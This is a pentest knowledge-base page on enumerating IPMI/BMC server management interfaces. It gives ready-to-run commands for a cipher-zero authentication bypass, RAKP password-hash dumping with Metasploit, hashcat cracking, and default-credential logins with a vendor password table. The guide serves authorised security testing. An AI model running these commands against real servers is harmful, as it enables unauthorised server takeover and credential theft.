% Filename: 02-reconnaissance/enum-misc/ipmi.md
% Display name: IPMI Enumeration
% Last update: 2026-02-10
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# IPMI Enumeration

## Overview

IPMI (Intelligent Platform Management Interface) runs on UDP 623. It provides out-of-band management for servers — power control, hardware monitoring, remote console, and BIOS configuration. IPMI is found on virtually every enterprise server via BMC (Baseboard Management Controller) implementations: Dell iDRAC, HP iLO, Supermicro IPMI, and Lenovo IMM. Enumeration targets version detection, default credentials, the IPMI 2.0 RAKP authentication hash disclosure vulnerability (CVE-2013-4786), and cipher suite 0 authentication bypass. Often overlooked during pentests, IPMI frequently yields the easiest initial access on internal networks.

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target UDP 623
- `ipmitool` installed (in Kali repos, not pre-installed: `sudo apt install ipmitool`)
- Metasploit Framework for hash dumping modules

## Enumeration Techniques

### Service Detection

```bash
# Nmap
# https://nmap.org/
nmap -sU -p 623 --script ipmi-version <target>
```

Expected output:
```text
623/udp open  asf-rmcp
| ipmi-version:
|   Version: IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null
|   Level: 1.5, 2.0
|_  Date: 2024-03-15T10:22:33
```

The version and authentication methods are critical. IPMI 2.0 is vulnerable to hash disclosure via the RAKP protocol by design.

### IPMI Version Scan with Metasploit

```msf
# Metasploit Framework
# https://www.metasploit.com/
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > set RHOSTS <target>
msf6 > run
```

Expected output:
```text
[*] 10.10.10.50:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null)
    PassAuth(password, md5, md2, null) Level(1.5, 2.0)
```

### Cipher Zero Authentication Bypass

IPMI 2.0 implementations may support cipher suite 0, which uses no encryption and no authentication integrity. This allows any command to be issued without credentials:

```bash
# ipmitool
# https://github.com/ipmitool/ipmitool
# Test cipher zero (no auth required)
ipmitool -I lanplus -H <target> -U "" -P "" -C 0 user list
```

If this returns a user list, the BMC accepts unauthenticated commands. This is a critical finding.

### IPMI 2.0 RAKP Hash Disclosure

The IPMI 2.0 RAKP (Remote Authenticated Key Exchange Protocol) authentication handshake discloses a salted HMAC-SHA1 hash of the user's password. This is a protocol design flaw — any valid username triggers the hash disclosure, even if the password is wrong. No authentication required.

```msf
# Metasploit Framework
# https://www.metasploit.com/
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set RHOSTS <target>
msf6 > set OUTPUT_HASHCAT_FILE /tmp/ipmi_hashes.txt
msf6 > run
```

Expected output:
```text
[+] 10.10.10.50:623 - IPMI - Hash found: admin:a]1629050200...
[+] 10.10.10.50:623 - IPMI - Hash for user 'admin' saved
```

The module attempts common usernames by default (`admin`, `ADMIN`, `root`, `Administrator`). Add custom usernames:

```bash
msf6 > set USER_FILE /usr/share/wordlists/ipmi_users.txt
```

Hashes are output in Hashcat-compatible format (mode 7300):

```bash
# Hashcat
# https://hashcat.net/hashcat/
hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Default Credentials

BMC interfaces ship with well-known default credentials. Test these before brute-forcing:

| Vendor | Product | Default Username | Default Password |
|--------|---------|-----------------|-----------------|
| Dell | iDRAC | root | calvin |
| HP | iLO | Administrator | (random, on pull-tab) |
| Supermicro | IPMI | ADMIN | ADMIN |
| IBM/Lenovo | IMM | USERID | PASSW0RD |
| Oracle | ILOM | root | changeme |
| Fujitsu | iRMC | admin | admin |

```bash
# ipmitool
# https://github.com/ipmitool/ipmitool
# Test Dell iDRAC default
ipmitool -I lanplus -H <target> -U root -P calvin user list

# Test Supermicro default
ipmitool -I lanplus -H <target> -U ADMIN -P ADMIN user list
```

### User Enumeration (Authenticated)

With valid credentials:

```bash
# ipmitool
# https://github.com/ipmitool/ipmitool
# List all BMC users
ipmitool -I lanplus -H <target> -U <user> -P <pass> user list

# Show channel authentication capabilities
ipmitool -I lanplus -H <target> -U <user> -P <pass> channel getaccess 1
```

Expected user list output:
```text
ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
1                    true    false      false      NO ACCESS
2   admin            true    false      true       ADMINISTRATOR
3   monitor          true    false      true       USER
```

Privilege levels: `CALLBACK`, `USER`, `OPERATOR`, `ADMINISTRATOR`, `OEM`. Administrator level provides full BMC control.

### BMC Information Gathering

```bash
# ipmitool
# https://github.com/ipmitool/ipmitool
# System information (manufacturer, product, serial)
ipmitool -I lanplus -H <target> -U <user> -P <pass> mc info

# Sensor readings (hardware status)
ipmitool -I lanplus -H <target> -U <user> -P <pass> sdr list

# System event log (reveals maintenance patterns)
ipmitool -I lanplus -H <target> -U <user> -P <pass> sel list

# Network configuration of the BMC
ipmitool -I lanplus -H <target> -U <user> -P <pass> lan print 1
```

The `lan print` command reveals the BMC's network configuration — IP, subnet, gateway, MAC. Useful for understanding the management network topology.

### Web Interface Discovery

Most BMC implementations also expose a web management interface on HTTPS (TCP 443). After discovering IPMI on UDP 623, check:

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 443,80,8080 <target>
```

The web interface often has additional vulnerabilities — exposed firmware versions, directory traversal, and authentication bypass bugs specific to the vendor and firmware version.

## Post-Enumeration

With BMC access confirmed, prioritize:
- Cracked IPMI hashes — BMC passwords are frequently reused for OS-level accounts, domain accounts, or other management interfaces
- Remote console access (SOL — Serial Over LAN) provides virtual KVM to the server, equivalent to physical console access
- Power control capability (for disruption assessment)
- BMC network configuration revealing management VLAN topology
- Firmware version for vendor-specific CVE checking (iDRAC, iLO vulnerabilities)

## References

### Official Documentation

- [IPMI 2.0 Specification (Intel)](https://www.intel.com/content/www/us/en/products/docs/servers/ipmi/ipmi-second-gen-interface-spec-v2-rev1-1.html)
- [Nmap ipmi-version NSE Script](https://nmap.org/nsedoc/scripts/ipmi-version.html)
- [ipmitool Project (GitHub)](https://github.com/ipmitool/ipmitool)
- [Metasploit ipmi_dumphashes Module](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)

### Pentest Guides & Research

- [Rapid7 - A Penetration Tester's Guide to IPMI and BMCs (HD Moore, 2013)](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/)
- [Cisco - IPMI Security Vulnerabilities](https://sec.cloudapps.cisco.com/security/center/resources/ipmi_vulnerabilities.html)
- [CERT-IST - Vulnerabilities IPMI/BMC](https://www.cert-ist.com/public/en/SO_detail?format=html&code=201309_ipmi)
- [Pen Test Partners - Backdoor in the Backplane: Doing IPMI Security Better](https://www.pentestpartners.com/security-blog/backdoor-in-the-backplane-doing-ipmi-security-better/)

### Default Credentials

- [Dell iDRAC Default Credentials (Official KB)](https://www.dell.com/support/kbdoc/en-us/000133536/dell-poweredge-what-is-the-default-username-and-password-for-idrac)
- [IPMI Default Password List (netbiosX GitHub)](https://github.com/netbiosX/Default-Credentials/blob/master/IPMI-Default-Password-List.mdown)

### CVE References

- [CVE-2013-4786 - IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval](https://nvd.nist.gov/vuln/detail/CVE-2013-4786)
- [Exploit-DB 38633 - IPMI 2.0 RAKP Remote SHA1 Hash Retrieval](https://www.exploit-db.com/exploits/38633)

### MITRE ATT&CK

- [T1595 - Active Scanning](https://attack.mitre.org/techniques/T1595/)
